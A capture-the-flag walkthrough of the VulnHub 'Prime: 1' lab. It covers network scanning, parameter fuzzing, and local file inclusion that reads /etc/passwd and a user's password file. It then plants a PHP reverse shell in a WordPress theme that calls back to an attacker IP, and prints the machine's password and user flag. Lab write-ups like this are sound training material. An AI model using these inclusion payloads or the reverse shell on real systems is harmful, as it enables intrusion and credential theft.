# Prime: 1

- **Machine:** Prime: 1
- **Download:** https://www.vulnhub.com/entry/prime-1,358/

![](853-1.png)

---

# Setup

1. Extract the downloaded RAR archive.
2. Create a new VirtualBox virtual machine.
3. Attach the provided **VMDK** file to the **IDE Controller**.
4. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](853-2.png)

---

## Full Nmap Scan

Perform a complete scan to enumerate ports, services, operating system, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.182
```

![](853-3.png)

---

## Optional Enumeration

```bash
nmap -v -p- 192.168.2.182
```

```bash
nmap -sC -sV -A 192.168.2.182
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.182
```

![](853-4.png)

---

# Web Enumeration

Visit the target website.

```text
http://192.168.2.182/
```

---

## Directory Enumeration

Brute-force directories.

```bash
gobuster dir -u http://192.168.2.182/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

![](853-5.png)

Discovered endpoints:

```text
http://192.168.2.182/secret.txt
http://192.168.2.182/dev
```

![](853-6.png)

The page suggests fuzzing for hidden parameters.

---

## Parameter Fuzzing

Enumerate hidden GET parameters.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://192.168.2.182/index.php?FUZZ=location.txt" --hh 136
```

![](853-7.png)

### Command Breakdown

| Option | Description |
|---------|-------------|
| `wfuzz` | Starts the fuzzing tool. |
| `-c` | Enables colored output. |
| `-w` | Specifies the wordlist. |
| `-u` | Specifies the target URL. |
| `FUZZ` | Placeholder replaced with values from the wordlist. |
| `location.txt` | Fixed parameter value. |
| `--hh 136` | Hides responses with a body length of 136 bytes. |

The correct parameter is discovered.

Visit:

```text
http://192.168.2.182/index.php?file=location.txt
```

![](853-8.png)

A new parameter name is revealed.

```text
secrettier360
```

---

## Local File Inclusion (LFI)

Browse to:

```text
http://192.168.2.182/image.php
```

Use the newly discovered parameter.

```text
http://192.168.2.182/image.php?secrettier360
```

![](853-9.png)

The parameter is vulnerable to Local File Inclusion.

Read the passwd file.

```text
http://192.168.2.182/image.php?secrettier360=/etc/passwd
```

![](853-10.png)

A normal user is identified.

```text
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```

Read the password file.

```text
http://192.168.2.182/image.php?secrettier360=/home/saket/password.txt
```

![](853-11.png)

Recovered password:

```text
follow_the_ippsec
```

---

# WordPress Access

Login to the WordPress administration panel.

```text
http://192.168.2.182/wordpress/wp-login.php
```

![](853-13.png)

Navigate to:

```text
Appearance → Theme Editor → Twenty Nineteen → secret.php
```

---

# Reverse Shell

Insert the following PHP reverse shell.

```php
<?php
$sock=fsockopen("192.168.2.219",443);
$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
```

![](853-14.png)

Start a Netcat listener.

```bash
nc -nlvp 443
```

Execute the uploaded file.

```text
http://192.168.2.182/wordpress/wp-content/themes/twentynineteen/secret.php
```

A reverse shell is received.

![](853-15.png)

---

# User Enumeration

Navigate to the home directory.

```bash
cd /home
```

List the users.

```bash
ls -lh
```

Move into Saket's home directory.

```bash
cd saket
```

List the files.

```bash
ls -lh
```

Read the user flag.

```bash
cat user.txt
```

![](853-16.png)

User flag:

```text
af3c658dcf9d7190da3153519c003456
```

---

# Privilege Escalation Enumeration

Enumerate the user's sudo permissions.

```bash
sudo -l
```

![](853-17.png)

Further privilege escalation can be performed based on the allowed sudo entries.

---

# Key Learning

- Enumerate hidden directories before attacking the application.
- Use **Wfuzz** to discover undocumented GET parameters.
- Identify and exploit **Local File Inclusion (LFI)** vulnerabilities.
- Sensitive files inside user home directories can expose credentials.
- Reuse discovered credentials to access WordPress.
- PHP code injection through the Theme Editor provides remote code execution.
- Always enumerate **sudo** permissions after obtaining an interactive shell.

---

# Summary

The machine was enumerated using Nmap and Gobuster, revealing several hidden directories. Parameter fuzzing with **Wfuzz** uncovered an undocumented GET parameter that was vulnerable to **Local File Inclusion**, allowing arbitrary file reads. Sensitive files in the user's home directory exposed credentials that were successfully reused to authenticate to the WordPress administration panel. By editing a theme file, a PHP reverse shell was uploaded and executed, providing an interactive shell. Finally, user enumeration revealed the user flag, and **sudo** permissions were inspected as the starting point for privilege escalation.